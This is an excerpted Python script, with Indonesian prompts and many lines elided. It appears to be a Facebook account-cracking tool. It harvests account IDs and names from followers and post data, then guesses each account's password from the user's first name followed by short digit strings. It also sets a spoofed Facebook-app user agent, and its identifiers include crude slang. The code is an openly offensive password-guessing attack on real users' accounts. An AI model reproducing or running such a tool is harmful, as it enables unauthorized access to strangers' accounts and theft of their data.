...
def masuk():
    ...
    jeeck("\033[1;36m[\033[1;35m6\033[1;36m]\033[0;00m DUMP USER-AGENT")
...
def followers(_jeeck_ganteng_kagakadapacar_,headers=header):
    ...
    try:
        ...
        for a in z['data']:
            ...
            sys.stdout.flush();jeda(0.0050)
        _jeeck_X_nano_sadcook_.close()
        jeeck(" \033[@;36m[\033[1;35m+\033[1;36m]\033[1;36m coppy file👉 : %s"%(file))
        raw_input('\n%s [ %senter %s] '%(P,B,P))
        menu()
    except Exception as e:
...
def postingan(_jeeck_ganteng_kagakadapacar_,headers=header):
    ...
    try:
#    	
        idt = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;36m Id postingan : ")
        simpan = raw_input(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;36m Nama file : ")
        ...
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            _jeeck_X_nano_sadcook_.write(a['id'] + '<=>' + a['name'] + '\n')
            jeeck(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;34m Mengumpulkan id : %s"%(str(len(id)))),
            sys.stdout.flush();jeda(0.0050)
        _jeeck_X_nano_sadcook_.close()
        jeeck(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;34m File tersimpan di : %s"%(file))
        raw_input('\n%s [ %senter %s] '%(P,B,P))
        menu()
    except Exception as e:
        jeeck(" \033[1;36m[\033[1;35m+\033[1;36m]\033[1;34m Gagal dump id / akun kemungkinan mati / id privat ");exit()
# ###
class ngentod:
            ...
            while True:
                ...
                if pwx == '':
                    ...
                    def _jeeck_X_nano_(_jeeck_X_nano_sayang_mamah__=None): 
                        _jeeck_X_ = raw_input("\n \033[1;36m[\033[1;35m+\033[1;36m]\033[0;00m Method : ")
                        if _jeeck_X_ == '':
            	...
            	for akun in self.id: 
                    try:
                        ...
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"12", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"12", _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345"]
...
def useragent():
	print("\n \033[1;36m[\033[1;35m1\033[1;36m]\033[0;00m Seting useragent")
	print(" \033[1;36m[\033[1;35m2\033[1;36m]\033[0;00m Chek useragent")
	print(" \033[1;36m[\033[1;35m0\033[1;36m]\033[0;00m Back")
	useragent_xnxx_()
def useragent_xnxx_():
    ...
    if u == '':
    	...
    	print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ketikan ,KONTOL, untuk mengunakan useragent tools")
    	try:
            ...
            elif ua in("KONTOL","kontol","Kontol"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
